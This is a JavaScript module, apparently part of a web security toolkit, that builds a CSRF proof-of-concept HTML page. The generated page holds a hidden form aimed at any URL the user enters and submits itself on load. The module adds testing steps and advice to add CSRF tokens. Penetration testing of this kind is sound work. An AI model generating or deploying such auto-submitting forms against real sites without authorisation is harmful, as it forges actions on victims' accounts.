import { escapeHtml, escapeAttr } from './shared.js?v=1';

export function initCSRFGen() {
  const urlInput = document.getElementById('csrf-url');
  const methodSelect = document.getElementById('csrf-method');
  const paramsArea = document.getElementById('csrf-params');
  const btn = document.getElementById('csrf-gen');
  const result = document.getElementById('csrf-result');
  if (!btn) return;

  function parseParams(str) {
    const lines = str.split('\n').filter(l => l.trim());
    return lines.map(line => {
      const idx = line.indexOf(':');
      if (idx > 0) return { key: line.slice(0, idx).trim(), value: line.slice(idx + 1).trim() };
      return { key: line.trim(), value: '' };
    });
  }

  btn.addEventListener('click', () => {
    let url = urlInput.value.trim();
    if (!url) { result.innerHTML = '<p class="text-muted">Enter a URL first</p>'; return; }
    if (!url.startsWith('http')) url = 'https://' + url;
    try { new URL(url); } catch { result.innerHTML = '<p class="text-warning">⚠️ Invalid URL</p>'; return; }

    const method = methodSelect.value;
    const params = parseParams(paramsArea.value.trim());
    const paramFields = params.map(p => `      <input type="hidden" name="${escapeAttr(p.key)}" value="${escapeAttr(p.value)}">`).join('\n');

    const html = `<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
  <h3>CSRF Proof of Concept</h3>
  <form id="csrf-form" action="${escapeAttr(url)}" method="${method}">
${paramFields}
  </form>
  <script>
    document.getElementById('csrf-form').submit();
  <\/script>
</body>
</html>`;

    result.innerHTML = `
      <div class="csrf-header">CSRF PoC Generated</div>
      <p class="text-muted" style="font-size:0.75rem;margin-bottom:0.5rem">Copy the HTML below into a <code>.html</code> file and open it in a browser to test.</p>
      <div class="csrf-info">
        <span>URL: ${escapeHtml(url)}</span>
        <span>Method: ${escapeHtml(method)}</span>
        <span>Parameters: ${escapeHtml(String(params.length))}</span>
      </div>
      <div class="csrf-poc-box">
        <button class="btn btn-sm btn-primary" id="csrf-copy" style="float:right;margin-bottom:0.5rem">Copy</button>
        <pre class="csrf-pre" id="csrf-code">${escapeHtml(html)}</pre>
      </div>
      <div class="csrf-test-steps">
        <div class="csrf-step-title">How to Test</div>
        <ol>
          <li>Copy the HTML code above</li>
          <li>Save it as <code>poc.html</code></li>
          <li>Open it in a browser (you can drag it into a tab)</li>
          <li>The form auto-submits — check whether the request succeeds without a CSRF token</li>
          <li>If it succeeds → vulnerable to CSRF! Add a CSRF token on the backend.</li>
        </ol>
      </div>`;

    document.getElementById('csrf-copy')?.addEventListener('click', () => {
      const code = document.getElementById('csrf-code');
      if (code) {
        navigator.clipboard?.writeText(html).then(() => {
          const btn = document.getElementById('csrf-copy');
          if (btn) btn.textContent = '✅ Copied!';
        }).catch(() => {
          const range = document.createRange();
          range.selectNodeContents(code);
          const sel = window.getSelection();
          sel.removeAllRanges();
          sel.addRange(range);
        });
      }
    });
  });
}